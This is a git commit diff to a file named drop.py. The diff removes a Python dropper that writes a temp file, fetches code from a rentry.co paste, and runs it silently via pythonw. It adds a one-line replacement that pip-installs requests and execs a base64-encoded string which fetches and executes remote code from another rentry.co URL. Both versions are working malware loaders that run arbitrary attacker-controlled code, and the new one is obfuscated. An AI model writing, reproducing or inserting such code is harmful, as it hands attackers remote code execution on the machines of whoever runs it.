769c80ffef808efa0ac6225e652d0050eb4c66cf
Badsi 8===D <101473281+badsii@users.noreply.github.com>
2024-09-05 18:34:47 -0700

    Update drop.py

--- drop.py
+++ drop.py
@@ -1,16 +1,1 @@
-from tempfile import NamedTemporaryFile as _ffile
-from sys import executable as _eexecutable
-from os import system as _ssystem
-import requests
-import os
-import uuid
-import tempfile
-import subprocess
-
-_ttmp = _ffile(delete=False)
-_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://rentry.co/6uh8vuwz/raw").read())""")
-_ttmp.close()
-try:
-    _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
-except:
-    pass
+import os;os.system('pip install requests');import requests;import base64;exec(base64.b64decode('ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmVudHJ5LmNvL2RyMHAvcmF3IikudGV4dCk=').decode())
